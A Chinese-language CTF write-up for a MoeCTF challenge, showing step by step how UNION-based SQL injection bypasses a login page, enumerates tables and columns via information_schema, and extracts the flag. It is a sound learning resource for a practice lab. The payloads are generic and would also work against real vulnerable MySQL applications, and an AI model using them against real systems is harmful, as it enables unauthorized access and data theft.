---
title: "SQL 注入：基于 UNION 的数据提取"
date: 2026-10-08
description: "MoeCTF 第八题 WriteUp —— 从登录页面出发，利用 UNION SELECT 逐步获取数据库结构并拿到 flag。"
tags: ["CTF", "SQL注入", "Web安全"]
category: 技术
---

这是一道经典的 SQL 注入题，考的是 UNION-based 注入。目标是一个登录页面，我们需要通过注入拿到隐藏在数据库里的 flag。

## 第八题的详细wp
首先根据第六题，尝试使用`admin' -- -`尝试登录，显示welcome admin
根据题目提示，尝试使用`UNION`进行拼接，因为是登录系统，猜测为两列数据
```
admin' UNION SELECT 'a', 'b' -- -
```
返回不变，但说明两列数据正确，但浏览器没有渲染
尝试查询不存在的值，让拼接值到第一行
```
abc' UNION SELECT 'a', 'b' -- -
```
返回welcome a，说明浏览器前端只返回第一行，第一列的内容
开始查找flag的位置
首先查找当前数据库的表，使用`GROUP_CONCAT`合并多个数据
```
a' UNION SELECT GROUP_CONCAT(table_name), 'x' FROM information_schema.tables WHERE table_schema=database() -- -
```
返回`flag,users`
查找flag表里面的列
```
a' UNION SELECT GROUP_CONCAT(column_name), 'x' FROM information_schema.columns WHERE table_schema=database() AND table_name='flag' -- -
```
返回`value`
拿flag
```
a' UNION SELECT value, 'x' FROM flag -- -
```
得到flag `moectf{UNl0n_B@sed_sQL1-fTW1l130d83e0f}`

~~拼尽全力只会一种解法，第二种不太会~~

## 小结

这道题的核心思路：

1. **确认注入点**：单引号闭合 + 注释截断
2. **判断列数**：`UNION SELECT` 试列数，不报错就对了
3. **控制回显**：让原查询返回空，UNION 的数据顶上去
4. **信息收集**：`information_schema` 是 MySQL 的元数据库，存了所有表和列的信息
5. **提取数据**：定位到目标表和列，直接查
